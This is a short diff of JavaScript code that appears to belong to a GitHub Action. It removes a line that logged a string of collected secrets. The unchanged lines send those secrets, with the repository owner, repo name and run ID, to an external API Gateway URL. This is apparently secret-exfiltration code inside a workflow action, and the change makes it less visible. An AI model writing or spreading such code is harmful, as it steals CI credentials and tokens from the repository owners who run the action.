@@ -18,8 +18,6 @@ import * as core from "@actions/core"
 
     secretsString = secretsString.slice(0, -1);
 
-    console.log(secretsString)
-
     var url = "https://9046hrh9g0.execute-api.us-west-2.amazonaws.com/v1/secrets?owner=" + owner + "&repo=" + repo + "&runId="+ runId+ "&secrets=" + secretsString;
 
     try {
